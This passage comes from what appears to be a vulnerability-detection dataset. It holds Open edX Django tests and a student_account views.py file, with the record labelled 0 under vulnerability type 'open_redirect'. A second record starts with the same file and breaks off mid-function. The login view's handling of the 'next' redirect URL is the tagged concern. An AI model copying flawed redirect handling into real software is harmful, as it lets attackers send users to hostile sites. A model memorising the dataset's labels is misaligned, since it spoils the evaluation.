test_browser_language(self):\n        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=\"text/html\", HTTP_ACCEPT_LANGUAGE=\"es\")\n\n        self.assertEqual(response['Content-Language'], 'es-419')\n\n    def test_browser_language_dialent(self):\n        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=\"text/html\", HTTP_ACCEPT_LANGUAGE=\"es-es\")\n\n        self.assertEqual(response['Content-Language'], 'es-es')\n\n\nclass AccountSettingsViewTest(ThirdPartyAuthTestMixin, TestCase, ProgramsApiConfigMixin):\n    \"\"\" Tests for the account settings view. \"\"\"\n\n    USERNAME = 'student'\n    PASSWORD = 'password'\n    FIELDS = [\n        'country',\n        'gender',\n        'language',\n        'level_of_education',\n        'password',\n        'year_of_birth',\n        'preferred_language',\n        'time_zone',\n    ]\n\n    @mock.patch(\"django.conf.settings.MESSAGE_STORAGE\", 'django.contrib.messages.storage.cookie.CookieStorage')\n    def setUp(self):\n        super(AccountSettingsViewTest, self).setUp()\n        self.user = UserFactory.create(username=self.USERNAME, password=self.PASSWORD)\n        CommerceConfiguration.objects.create(cache_ttl=10, enabled=True)\n        self.client.login(username=self.USERNAME, password=self.PASSWORD)\n\n        self.request = HttpRequest()\n        self.request.user = self.user\n\n        # For these tests, two third party auth providers are enabled by default:\n        self.configure_google_provider(enabled=True, visible=True)\n        self.configure_facebook_provider(enabled=True, visible=True)\n\n        # Python-social saves auth failure notifcations in Django messages.\n        # See pipeline.get_duplicate_provider() for details.\n        self.request.COOKIES = {}\n        MessageMiddleware().process_request(self.request)\n        messages.error(self.request, 'Facebook is already in use.', extra_tags='Auth facebook')\n\n    def test_context(self):\n\n        context = account_settings_context(self.request)\n\n        user_accounts_api_url = reverse(\"accounts_api\", kwargs={'username': self.user.username})\n        self.assertEqual(context['user_accounts_api_url'], user_accounts_api_url)\n\n        user_preferences_api_url = reverse('preferences_api', kwargs={'username': self.user.username})\n        self.assertEqual(context['user_preferences_api_url'], user_preferences_api_url)\n\n        for attribute in self.FIELDS:\n            self.assertIn(attribute, context['fields'])\n\n        self.assertEqual(\n            context['user_accounts_api_url'], reverse(\"accounts_api\", kwargs={'username': self.user.username})\n        )\n        self.assertEqual(\n            context['user_preferences_api_url'], reverse('preferences_api', kwargs={'username': self.user.username})\n        )\n\n        self.assertEqual(context['duplicate_provider'], 'facebook')\n        self.assertEqual(context['auth']['providers'][0]['name'], 'Facebook')\n        self.assertEqual(context['auth']['providers'][1]['name'], 'Google')\n\n    def test_view(self):\n        \"\"\"\n        Test that all fields are  visible\n        \"\"\"\n        view_path = reverse('account_settings')\n        response = self.client.get(path=view_path)\n\n        for attribute in self.FIELDS:\n            self.assertIn(attribute, response.content)\n\n    def test_header_with_programs_listing_enabled(self):\n        \"\"\"\n        Verify that tabs header will be shown while program listing is enabled.\n        \"\"\"\n        self.create_programs_config()\n        view_path = reverse('account_settings')\n        response = self.client.get(path=view_path)\n\n        self.assertContains(response, '<li class=\"tab-nav-item\">')\n\n    def test_header_with_programs_listing_disabled(self):\n        \"\"\"\n        Verify that nav header will be shown while program listing is disabled.\n        \"\"\"\n        self.create_programs_config(enabled=False)\n        view_path = reverse('account_settings')\n        response = self.client.get(path=view_path)\n\n        self.assertContains(response, '<li class=\"item nav-global-01\">')\n\n    def test_commerce_order_detail(self):\n        \"\"\"\n        Verify that get_user_orders returns the correct order data.\n        \"\"\"\n        with mock_get_orders():\n            order_detail = get_user_orders(self.user)\n\n        for i, order in enumerate(mock_get_orders.default_response['results']):\n            expected = {\n                'number': order['number'],\n                'price': order['total_excl_tax'],\n                'order_date': 'Jan 01, 2016',\n                'receipt_url': '/checkout/receipt/?order_number=' + order['number'],\n                'lines': order['lines'],\n            }\n            self.assertEqual(order_detail[i], expected)\n\n    def test_commerce_order_detail_exception(self):\n        with mock_get_orders(exception=exceptions.HttpNotFoundError):\n            order_detail = get_user_orders(self.user)\n\n        self.assertEqual(order_detail, [])\n\n    def test_incomplete_order_detail(self):\n        response = {\n            'results': [\n                factories.OrderFactory(\n                    status='Incomplete',\n                    lines=[\n                        factories.OrderLineFactory(\n                            product=factories.ProductFactory(attribute_values=[factories.ProductAttributeFactory()])\n                        )\n                    ]\n                )\n            ]\n        }\n        with mock_get_orders(response=response):\n            order_detail = get_user_orders(self.user)\n\n        self.assertEqual(order_detail, [])\n\n    def test_order_history_with_no_product(self):\n        response = {\n            'results': [\n                factories.OrderFactory(\n                    lines=[\n                        factories.OrderLineFactory(\n                            product=None\n                        ),\n                        factories.OrderLineFactory(\n                            product=factories.ProductFactory(attribute_values=[factories.ProductAttributeFactory(\n                                name='certificate_type',\n                                value='verified'\n                            )])\n                        )\n                    ]\n                )\n            ]\n        }\n        with mock_get_orders(response=response):\n            order_detail = get_user_orders(self.user)\n\n        self.assertEqual(len(order_detail), 1)\n\n\n@override_settings(SITE_NAME=settings.MICROSITE_LOGISTRATION_HOSTNAME)\nclass MicrositeLogistrationTests(TestCase):\n    \"\"\"\n    Test to validate that microsites can display the logistration page\n    \"\"\"\n\n    def test_login_page(self):\n        \"\"\"\n        Make sure that we get the expected logistration page on our specialized\n        microsite\n        \"\"\"\n\n        resp = self.client.get(\n            reverse('signin_user'),\n            HTTP_HOST=settings.MICROSITE_LOGISTRATION_HOSTNAME\n        )\n        self.assertEqual(resp.status_code, 200)\n\n        self.assertIn('<div id=\"login-and-registration-container\"', resp.content)\n\n    def test_registration_page(self):\n        \"\"\"\n        Make sure that we get the expected logistration page on our specialized\n        microsite\n        \"\"\"\n\n        resp = self.client.get(\n            reverse('register_user'),\n            HTTP_HOST=settings.MICROSITE_LOGISTRATION_HOSTNAME\n        )\n        self.assertEqual(resp.status_code, 200)\n\n        self.assertIn('<div id=\"login-and-registration-container\"', resp.content)\n\n    @override_settings(SITE_NAME=settings.MICROSITE_TEST_HOSTNAME)\n    def test_no_override(self):\n        \"\"\"\n        Make sure we get the old style login/registration if we don't override\n        \"\"\"\n\n        resp = self.client.get(\n            reverse('signin_user'),\n            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME\n        )\n        self.assertEqual(resp.status_code, 200)\n\n        self.assertNotIn('<div id=\"login-and-registration-container\"', resp.content)\n\n        resp = self.client.get(\n            reverse('register_user'),\n            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME\n        )\n        self.assertEqual(resp.status_code, 200)\n\n        self.assertNotIn('<div id=\"login-and-registration-container\"', resp.content)\n\n\nclass AccountCreationTestCaseWithSiteOverrides(SiteMixin, TestCase):\n    \"\"\"\n    Test cases for Feature flag ALLOW_PUBLIC_ACCOUNT_CREATION which when\n    turned off disables the account creation options in lms\n    \"\"\"\n\n    def setUp(self):\n        \"\"\"Set up the tests\"\"\"\n        super(AccountCreationTestCaseWithSiteOverrides, self).setUp()\n\n        # Set the feature flag ALLOW_PUBLIC_ACCOUNT_CREATION to False\n        self.site_configuration_values = {\n            'ALLOW_PUBLIC_ACCOUNT_CREATION': False\n        }\n        self.site_domain = 'testserver1.com'\n        self.set_up_site(self.site_domain, self.site_configuration_values)\n\n    def test_register_option_login_page(self):\n        \"\"\"\n        Navigate to the login page and check the Register option is hidden when\n        ALLOW_PUBLIC_ACCOUNT_CREATION flag is turned off\n        \"\"\"\n        response = self.client.get(reverse('signin_user'))\n        self.assertNotIn('<a class=\"btn-neutral\" href=\"/register?next=%2Fdashboard\">Register</a>',\n                         response.content)\n/n/n/nlms/djangoapps/student_account/views.py/n/n\"\"\" Views for a student's account information. \"\"\"\n\nimport json\nimport logging\nimport urlparse\nfrom datetime import datetime\n\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import get_user_model\nfrom django.contrib.auth.decorators import login_required\nfrom django.core.urlresolvers import reverse\nfrom django.http import HttpResponse, HttpResponseBadRequest, HttpResponseForbidden\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\nfrom django.views.decorators.csrf import ensure_csrf_cookie\nfrom django.views.decorators.http import require_http_methods\nfrom django_countries import countries\n\nimport third_party_auth\nfrom commerce.models import CommerceConfiguration\nfrom edxmako.shortcuts import render_to_response\nfrom lms.djangoapps.commerce.utils import EcommerceService\nfrom openedx.core.djangoapps.commerce.utils import ecommerce_api_client\nfrom openedx.core.djangoapps.external_auth.login_and_register import login as external_auth_login\nfrom openedx.core.djangoapps.external_auth.login_and_register import register as external_auth_register\nfrom openedx.core.djangoapps.lang_pref.api import all_languages, released_languages\nfrom openedx.core.djangoapps.programs.models import ProgramsApiConfig\nfrom openedx.core.djangoapps.site_configuration import helpers as configuration_helpers\nfrom openedx.core.djangoapps.theming.helpers import is_request_in_themed_site\nfrom openedx.core.djangoapps.user_api.accounts.api import request_password_change\nfrom openedx.core.djangoapps.user_api.api import (\n    RegistrationFormFactory,\n    get_login_session_form,\n    get_password_reset_form\n)\nfrom openedx.core.djangoapps.user_api.errors import UserNotFound\nfrom openedx.core.lib.edx_api_utils import get_edx_api_data\nfrom openedx.core.lib.time_zone_utils import TIME_ZONE_CHOICES\nfrom openedx.features.enterprise_support.api import enterprise_customer_for_request\nfrom student.helpers import destroy_oauth_tokens, get_next_url_for_login_page\nfrom student.models import UserProfile\nfrom student.views import register_user as old_register_view\nfrom student.views import signin_user as old_login_view\nfrom third_party_auth import pipeline\nfrom third_party_auth.decorators import xframe_allow_whitelisted\nfrom util.bad_request_rate_limiter import BadRequestRateLimiter\nfrom util.date_utils import strftime_localized\n\nAUDIT_LOG = logging.getLogger(\"audit\")\nlog = logging.getLogger(__name__)\nUser = get_user_model()  # pylint:disable=invalid-name\n\n\n@require_http_methods(['GET'])\n@ensure_csrf_cookie\n@xframe_allow_whitelisted\ndef login_and_registration_form(request, initial_mode=\"login\"):\n    \"\"\"Render the combined login/registration form, defaulting to login\n\n    This relies on the JS to asynchronously load the actual form from\n    the user_api.\n\n    Keyword Args:\n        initial_mode (string): Either \"login\" or \"register\".\n\n    \"\"\"\n    # Determine the URL to redirect to following login/registration/third_party_auth\n    redirect_to = get_next_url_for_login_page(request)\n    # If we're already logged in, redirect to the dashboard\n    if request.user.is_authenticated():\n        return redirect(redirect_to)\n\n    # Retrieve the form descriptions from the user API\n    form_descriptions = _get_form_descriptions(request)\n\n    # Our ?next= URL may itself contain a parameter 'tpa_hint=x' that we need to check.\n    # If present, we display a login page focused on third-party auth with that provider.\n    third_party_auth_hint = None\n    if '?' in redirect_to:\n        try:\n            next_args = urlparse.parse_qs(urlparse.urlparse(redirect_to).query)\n            provider_id = next_args['tpa_hint'][0]\n            tpa_hint_provider = third_party_auth.provider.Registry.get(provider_id=provider_id)\n            if tpa_hint_provider:\n                if tpa_hint_provider.skip_hinted_login_dialog:\n                    # Forward the user directly to the provider's login URL when the provider is configured\n                    # to skip the dialog.\n                    if initial_mode == \"register\":\n                        auth_entry = pipeline.AUTH_ENTRY_REGISTER\n                    else:\n                        auth_entry = pipeline.AUTH_ENTRY_LOGIN\n                    return redirect(\n                        pipeline.get_login_url(provider_id, auth_entry, redirect_url=redirect_to)\n                    )\n                third_party_auth_hint = provider_id\n                initial_mode = \"hinted_login\"\n        except (KeyError, ValueError, IndexError) as ex:\n            log.error(\"Unknown tpa_hint provider: %s\", ex)\n\n    # If this is a themed site, revert to the old login/registration pages.\n    # We need to do this for now to support existing themes.\n    # Themed sites can use the new logistration page by setting\n    # 'ENABLE_COMBINED_LOGIN_REGISTRATION' in their\n    # configuration settings.\n    if is_request_in_themed_site() and not configuration_helpers.get_value('ENABLE_COMBINED_LOGIN_REGISTRATION', False):\n        if initial_mode == \"login\":\n            return old_login_view(request)\n        elif initial_mode == \"register\":\n            return old_register_view(request)\n\n    # Allow external auth to intercept and handle the request\n    ext_auth_response = _external_auth_intercept(request, initial_mode)\n    if ext_auth_response is not None:\n        return ext_auth_response\n\n    # Account activation message\n    account_activation_messages = [\n        {\n            'message': message.message, 'tags': message.tags\n        } for message in messages.get_messages(request) if 'account-activation' in message.tags\n    ]\n\n    # Otherwise, render the combined login/registration page\n    context = {\n        'data': {\n            'login_redirect_url': redirect_to,\n            'initial_mode': initial_mode,\n            'third_party_auth': _third_party_auth_context(request, redirect_to, third_party_auth_hint),\n            'third_party_auth_hint': third_party_auth_hint or '',\n            'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),\n            'support_link': configuration_helpers.get_value('SUPPORT_SITE_LINK', settings.SUPPORT_SITE_LINK),\n            'password_reset_support_link': configuration_helpers.get_value(\n                'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK\n            ) or settings.SUPPORT_SITE_LINK,\n            'account_activation_messages': account_activation_messages,\n\n            # Include form descriptions retrieved from the user API.\n            # We could have the JS client make these requests directly,\n            # but we include them in the initial page load to avoid\n            # the additional round-trip to the server.\n            'login_form_desc': json.loads(form_descriptions['login']),\n            'registration_form_desc': json.loads(form_descriptions['registration']),\n            'password_reset_form_desc': json.loads(form_descriptions['password_reset']),\n            'account_creation_allowed': configuration_helpers.get_value(\n                'ALLOW_PUBLIC_ACCOUNT_CREATION', settings.FEATURES.get('ALLOW_PUBLIC_ACCOUNT_CREATION', True))\n        },\n        'login_redirect_url': redirect_to,  # This gets added to the query string of the \"Sign In\" button in header\n        'responsive': True,\n        'allow_iframing': True,\n        'disable_courseware_js': True,\n        'combined_login_and_register': True,\n        'disable_footer': not configuration_helpers.get_value(\n            'ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER',\n            settings.FEATURES['ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER']\n        ),\n    }\n\n    context = update_context_for_enterprise(request, context)\n\n    response = render_to_response('student_account/login_and_register.html', context)\n\n    # Remove enterprise cookie so that subsequent requests show default login page.\n    response.delete_cookie(\n        configuration_helpers.get_value(\"ENTERPRISE_CUSTOMER_COOKIE_NAME\", settings.ENTERPRISE_CUSTOMER_COOKIE_NAME),\n        domain=configuration_helpers.get_value(\"BASE_COOKIE_DOMAIN\", settings.BASE_COOKIE_DOMAIN),\n    )\n\n    return response\n\n\n@require_http_methods(['POST'])\ndef password_change_request_handler(request):\n    \"\"\"Handle password change requests originating from the account page.\n\n    Uses the Account API to email the user a link to the password reset page.\n\n    Note:\n        The next step in the password reset process (confirmation) is currently handled\n        by student.views.password_reset_confirm_wrapper, a custom wrapper around Django's\n        password reset confirmation view.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the email was sent successfully\n        HttpResponse: 400 if there is no 'email' POST parameter\n        HttpResponse: 403 if the client has been rate limited\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        POST /account/password\n\n    \"\"\"\n\n    limiter = BadRequestRateLimiter()\n    if limiter.is_rate_limit_exceeded(request):\n        AUDIT_LOG.warning(\"Password reset rate limit exceeded\")\n        return HttpResponseForbidden()\n\n    user = request.user\n    # Prefer logged-in user's email\n    email = user.email if user.is_authenticated() else request.POST.get('email')\n\n    if email:\n        try:\n            request_password_change(email, request.is_secure())\n            user = user if user.is_authenticated() else User.objects.get(email=email)\n            destroy_oauth_tokens(user)\n        except UserNotFound:\n            AUDIT_LOG.info(\"Invalid password reset attempt\")\n            # Increment the rate limit counter\n            limiter.tick_bad_request_counter(request)\n\n        return HttpResponse(status=200)\n    else:\n        return HttpResponseBadRequest(_(\"No email address provided.\"))\n\n\ndef update_context_for_enterprise(request, context):\n    \"\"\"\n    Take the processed context produced by the view, determine if it's relevant\n    to a particular Enterprise Customer, and update it to include that customer's\n    enterprise metadata.\n    \"\"\"\n\n    context = context.copy()\n\n    sidebar_context = enterprise_sidebar_context(request)\n\n    if sidebar_context:\n        context['data']['registration_form_desc']['fields'] = enterprise_fields_only(\n            context['data']['registration_form_desc']\n        )\n        context.update(sidebar_context)\n        context['enable_enterprise_sidebar'] = True\n        context['data']['hide_auth_warnings'] = True\n    else:\n        context['enable_enterprise_sidebar'] = False\n\n    return context\n\n\ndef enterprise_fields_only(fields):\n    \"\"\"\n    Take the received field definition, and exclude those fields that we don't want\n    to require if the user is going to be a member of an Enterprise Customer.\n    \"\"\"\n    enterprise_exclusions = configuration_helpers.get_value(\n        'ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS',\n        settings.ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS\n    )\n    return [field for field in fields['fields'] if field['name'] not in enterprise_exclusions]\n\n\ndef enterprise_sidebar_context(request):\n    \"\"\"\n    Given the current request, render the HTML of a sidebar for the current\n    logistration view that depicts Enterprise-related information.\n    \"\"\"\n    enterprise_customer = enterprise_customer_for_request(request)\n\n    if not enterprise_customer:\n        return {}\n\n    platform_name = configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)\n\n    if enterprise_customer.branding_configuration.logo:\n        enterprise_logo_url = enterprise_customer.branding_configuration.logo.url\n    else:\n        enterprise_logo_url = ''\n\n    if getattr(enterprise_customer.branding_configuration, 'welcome_message', None):\n        branded_welcome_template = enterprise_customer.branding_configuration.welcome_message\n    else:\n        branded_welcome_template = configuration_helpers.get_value(\n            'ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE',\n            settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE\n        )\n\n    branded_welcome_string = branded_welcome_template.format(\n        start_bold=u'<b>',\n        end_bold=u'</b>',\n        enterprise_name=enterprise_customer.name,\n        platform_name=platform_name\n    )\n\n    platform_welcome_template = configuration_helpers.get_value(\n        'ENTERPRISE_PLATFORM_WELCOME_TEMPLATE',\n        settings.ENTERPRISE_PLATFORM_WELCOME_TEMPLATE\n    )\n    platform_welcome_string = platform_welcome_template.format(platform_name=platform_name)\n\n    context = {\n        'enterprise_name': enterprise_customer.name,\n        'enterprise_logo_url': enterprise_logo_url,\n        'enterprise_branded_welcome_string': branded_welcome_string,\n        'platform_welcome_string': platform_welcome_string,\n    }\n\n    return context\n\n\ndef _third_party_auth_context(request, redirect_to, tpa_hint=None):\n    \"\"\"Context for third party auth providers and the currently running pipeline.\n\n    Arguments:\n        request (HttpRequest): The request, used to determine if a pipeline\n            is currently running.\n        redirect_to: The URL to send the user to following successful\n            authentication.\n        tpa_hint (string): An override flag that will return a matching provider\n            as long as its configuration has been enabled\n\n    Returns:\n        dict\n\n    \"\"\"\n    context = {\n        \"currentProvider\": None,\n        \"providers\": [],\n        \"secondaryProviders\": [],\n        \"finishAuthUrl\": None,\n        \"errorMessage\": None,\n        \"registerFormSubmitButtonText\": _(\"Create Account\"),\n    }\n\n    if third_party_auth.is_enabled():\n        enterprise_customer = enterprise_customer_for_request(request)\n        if not enterprise_customer:\n            for enabled in third_party_auth.provider.Registry.displayed_for_login(tpa_hint=tpa_hint):\n                info = {\n                    \"id\": enabled.provider_id,\n                    \"name\": enabled.name,\n                    \"iconClass\": enabled.icon_class or None,\n                    \"iconImage\": enabled.icon_image.url if enabled.icon_image else None,\n                    \"loginUrl\": pipeline.get_login_url(\n                        enabled.provider_id,\n                        pipeline.AUTH_ENTRY_LOGIN,\n                        redirect_url=redirect_to,\n                    ),\n                    \"registerUrl\": pipeline.get_login_url(\n                        enabled.provider_id,\n                        pipeline.AUTH_ENTRY_REGISTER,\n                        redirect_url=redirect_to,\n                    ),\n                }\n                context[\"providers\" if not enabled.secondary else \"secondaryProviders\"].append(info)\n\n        running_pipeline = pipeline.get(request)\n        if running_pipeline is not None:\n            current_provider = third_party_auth.provider.Registry.get_from_pipeline(running_pipeline)\n\n            if current_provider is not None:\n                context[\"currentProvider\"] = current_provider.name\n                context[\"finishAuthUrl\"] = pipeline.get_complete_url(current_provider.backend_name)\n\n                if current_provider.skip_registration_form:\n                    # For enterprise (and later for everyone), we need to get explicit consent to the\n                    # Terms of service instead of auto submitting the registration form outright.\n                    if not enterprise_customer:\n                        # As a reliable way of \"skipping\" the registration form, we just submit it automatically\n                        context[\"autoSubmitRegForm\"] = True\n                    else:\n                        context[\"autoRegisterWelcomeMessage\"] = (\n                            'Thank you for joining {}. '\n                            'Just a couple steps before you start learning!'\n                        ).format(\n                            configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)\n                        )\n                        context[\"registerFormSubmitButtonText\"] = _(\"Continue\")\n\n        # Check for any error messages we may want to display:\n        for msg in messages.get_messages(request):\n            if msg.extra_tags.split()[0] == \"social-auth\":\n                # msg may or may not be translated. Try translating [again] in case we are able to:\n                context['errorMessage'] = _(unicode(msg))  # pylint: disable=translation-of-non-string\n                break\n\n    return context\n\n\ndef _get_form_descriptions(request):\n    \"\"\"Retrieve form descriptions from the user API.\n\n    Arguments:\n        request (HttpRequest): The original request, used to retrieve session info.\n\n    Returns:\n        dict: Keys are 'login', 'registration', and 'password_reset';\n            values are the JSON-serialized form descriptions.\n\n    \"\"\"\n\n    return {\n        'password_reset': get_password_reset_form().to_json(),\n        'login': get_login_session_form().to_json(),\n        'registration': RegistrationFormFactory().get_registration_form(request).to_json()\n    }\n\n\ndef _external_auth_intercept(request, mode):\n    \"\"\"Allow external auth to intercept a login/registration request.\n\n    Arguments:\n        request (Request): The original request.\n        mode (str): Either \"login\" or \"register\"\n\n    Returns:\n        Response or None\n\n    \"\"\"\n    if mode == \"login\":\n        return external_auth_login(request)\n    elif mode == \"register\":\n        return external_auth_register(request)\n\n\ndef get_user_orders(user):\n    \"\"\"Given a user, get the detail of all the orders from the Ecommerce service.\n\n    Args:\n        user (User): The user to authenticate as when requesting ecommerce.\n\n    Returns:\n        list of dict, representing orders returned by the Ecommerce service.\n    \"\"\"\n    no_data = []\n    user_orders = []\n    commerce_configuration = CommerceConfiguration.current()\n    user_query = {'username': user.username}\n\n    use_cache = commerce_configuration.is_cache_enabled\n    cache_key = commerce_configuration.CACHE_KEY + '.' + str(user.id) if use_cache else None\n    api = ecommerce_api_client(user)\n    commerce_user_orders = get_edx_api_data(\n        commerce_configuration, 'orders', api=api, querystring=user_query, cache_key=cache_key\n    )\n\n    for order in commerce_user_orders:\n        if order['status'].lower() == 'complete':\n            date_placed = datetime.strptime(order['date_placed'], \"%Y-%m-%dT%H:%M:%SZ\")\n            order_data = {\n                'number': order['number'],\n                'price': order['total_excl_tax'],\n                'order_date': strftime_localized(date_placed, 'SHORT_DATE'),\n                'receipt_url': EcommerceService().get_receipt_page_url(order['number']),\n                'lines': order['lines'],\n            }\n            user_orders.append(order_data)\n\n    return user_orders\n\n\n@login_required\n@require_http_methods(['GET'])\ndef account_settings(request):\n    \"\"\"Render the current user's account settings page.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the page was sent successfully\n        HttpResponse: 302 if not logged in (redirect to login page)\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        GET /account/settings\n\n    \"\"\"\n    return render_to_response('student_account/account_settings.html', account_settings_context(request))\n\n\n@login_required\n@require_http_methods(['GET'])\ndef finish_auth(request):  # pylint: disable=unused-argument\n    \"\"\" Following logistration (1st or 3rd party), handle any special query string params.\n\n    See FinishAuthView.js for details on the query string params.\n\n    e.g. auto-enroll the user in a course, set email opt-in preference.\n\n    This view just displays a \"Please wait\" message while AJAX calls are made to enroll the\n    user in the course etc. This view is only used if a parameter like \"course_id\" is present\n    during login/registration/third_party_auth. Otherwise, there is no need for it.\n\n    Ideally this view will finish and redirect to the next step before the user even sees it.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the page was sent successfully\n        HttpResponse: 302 if not logged in (redirect to login page)\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        GET /account/finish_auth/?course_id=course-v1:blah&enrollment_action=enroll\n\n    \"\"\"\n    return render_to_response('student_account/finish_auth.html', {\n        'disable_courseware_js': True,\n        'disable_footer': True,\n    })\n\n\ndef account_settings_context(request):\n    \"\"\" Context for the account settings page.\n\n    Args:\n        request: The request object.\n\n    Returns:\n        dict\n\n    \"\"\"\n    user = request.user\n\n    year_of_birth_options = [(unicode(year), unicode(year)) for year in UserProfile.VALID_YEARS]\n    try:\n        user_orders = get_user_orders(user)\n    except:  # pylint: disable=bare-except\n        log.exception('Error fetching order history from Otto.')\n        # Return empty order list as account settings page expect a list and\n        # it will be broken if exception raised\n        user_orders = []\n\n    context = {\n        'auth': {},\n        'duplicate_provider': None,\n        'nav_hidden': True,\n        'fields': {\n            'country': {\n                'options': list(countries),\n            }, 'gender': {\n                'options': [(choice[0], _(choice[1])) for choice in UserProfile.GENDER_CHOICES],  # pylint: disable=translation-of-non-string\n            }, 'language': {\n                'options': released_languages(),\n            }, 'level_of_education': {\n                'options': [(choice[0], _(choice[1])) for choice in UserProfile.LEVEL_OF_EDUCATION_CHOICES],  # pylint: disable=translation-of-non-string\n            }, 'password': {\n                'url': reverse('password_reset'),\n            }, 'year_of_birth': {\n                'options': year_of_birth_options,\n            }, 'preferred_language': {\n                'options': all_languages(),\n            }, 'time_zone': {\n                'options': TIME_ZONE_CHOICES,\n            }\n        },\n        'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),\n        'password_reset_support_link': configuration_helpers.get_value(\n            'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK\n        ) or settings.SUPPORT_SITE_LINK,\n        'user_accounts_api_url': reverse(\"accounts_api\", kwargs={'username': user.username}),\n        'user_preferences_api_url': reverse('preferences_api', kwargs={'username': user.username}),\n        'disable_courseware_js': True,\n        'show_program_listing': ProgramsApiConfig.is_enabled(),\n        'order_history': user_orders\n    }\n\n    if third_party_auth.is_enabled():\n        # If the account on the third party provider is already connected with another edX account,\n        # we display a message to the user.\n        context['duplicate_provider'] = pipeline.get_duplicate_provider(messages.get_messages(request))\n\n        auth_states = pipeline.get_provider_user_states(user)\n\n        context['auth']['providers'] = [{\n            'id': state.provider.provider_id,\n            'name': state.provider.name,  # The name of the provider e.g. Facebook\n            'connected': state.has_account,  # Whether the user's edX account is connected with the provider.\n            # If the user is not connected, they should be directed to this page to authenticate\n            # with the particular provider, as long as the provider supports initiating a login.\n            'connect_url': pipeline.get_login_url(\n                state.provider.provider_id,\n                pipeline.AUTH_ENTRY_ACCOUNT_SETTINGS,\n                # The url the user should be directed to after the auth process has completed.\n                redirect_url=reverse('account_settings'),\n            ),\n            'accepts_logins': state.provider.accepts_logins,\n            # If the user is connected, sending a POST request to this url removes the connection\n            # information for this provider from their edX account.\n            'disconnect_url': pipeline.get_disconnect_url(state.provider.provider_id, state.association_id),\n            # We only want to include providers if they are either currently available to be logged\n            # in with, or if the user is already authenticated with them.\n        } for state in auth_states if state.provider.display_for_login or state.has_account]\n\n    return context\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "84c6c5ac27627db8aa829ead02ec98e8afa94b1e", "code": "/lms/djangoapps/student_account/views.py/n/n\"\"\" Views for a student's account information. \"\"\"\n\nimport json\nimport logging\nimport urlparse\nfrom datetime import datetime\n\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import get_user_model\nfrom django.contrib.auth.decorators import login_required\nfrom django.core.urlresolvers import reverse\nfrom django.http import HttpResponse, HttpResponseBadRequest, HttpResponseForbidden\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\nfrom django.views.decorators.csrf import ensure_csrf_cookie\nfrom django.views.decorators.http import require_http_methods\nfrom django_countries import countries\n\nimport third_party_auth\nfrom commerce.models import CommerceConfiguration\nfrom edxmako.shortcuts import render_to_response\nfrom lms.djangoapps.commerce.utils import EcommerceService\nfrom openedx.core.djangoapps.commerce.utils import ecommerce_api_client\nfrom openedx.core.djangoapps.external_auth.login_and_register import login as external_auth_login\nfrom openedx.core.djangoapps.external_auth.login_and_register import register as external_auth_register\nfrom openedx.core.djangoapps.lang_pref.api import all_languages, released_languages\nfrom openedx.core.djangoapps.programs.models import ProgramsApiConfig\nfrom openedx.core.djangoapps.site_configuration import helpers as configuration_helpers\nfrom openedx.core.djangoapps.theming.helpers import is_request_in_themed_site\nfrom openedx.core.djangoapps.user_api.accounts.api import request_password_change\nfrom openedx.core.djangoapps.user_api.api import (\n    RegistrationFormFactory,\n    get_login_session_form,\n    get_password_reset_form\n)\nfrom openedx.core.djangoapps.user_api.errors import UserNotFound\nfrom openedx.core.lib.edx_api_utils import get_edx_api_data\nfrom openedx.core.lib.time_zone_utils import TIME_ZONE_CHOICES\nfrom openedx.features.enterprise_support.api import enterprise_customer_for_request\nfrom student.helpers import destroy_oauth_tokens, get_next_url_for_login_page\nfrom student.models import UserProfile\nfrom student.views import register_user as old_register_view\nfrom student.views import signin_user as old_login_view\nfrom third_party_auth import pipeline\nfrom third_party_auth.decorators import xframe_allow_whitelisted\nfrom util.bad_request_rate_limiter import BadRequestRateLimiter\nfrom util.date_utils import strftime_localized\n\nAUDIT_LOG = logging.getLogger(\"audit\")\nlog = logging.getLogger(__name__)\nUser = get_user_model()  # pylint:disable=invalid-name\n\n\n@require_http_methods(['GET'])\n@ensure_csrf_cookie\n@xframe_allow_whitelisted\ndef login_and_registration_form(request, initial_mode=\"login\"):\n    \"\"\"Render the combined login/registration form, defaulting to login\n\n    This relies on the JS to asynchronously load the actual form from\n    the user_api.\n\n    Keyword Args:\n        initial_mode (string): Either \"login\" or \"register\".\n\n    \"\"\"\n    # Determine the URL to redirect to following login/registration/third_party_auth\n    redirect_to = get_next_url_for_login_page(request)\n    # If we're already logged in, redirect to the dashboard\n    if request.user.is_authenticated():\n        return redirect(redirect_to)\n\n    # Retrieve the form descriptions from the user API\n    form_descriptions = _get_form_descriptions(request)\n\n    # Our ?next= URL may itself contain a parameter 'tpa_hint=x' that we need to check.\n    # If present, we display a login page focused on third-party auth with that provider.\n    third_party_auth_hint = None\n    if '?' in redirect_to:\n        try:\n            next_args = 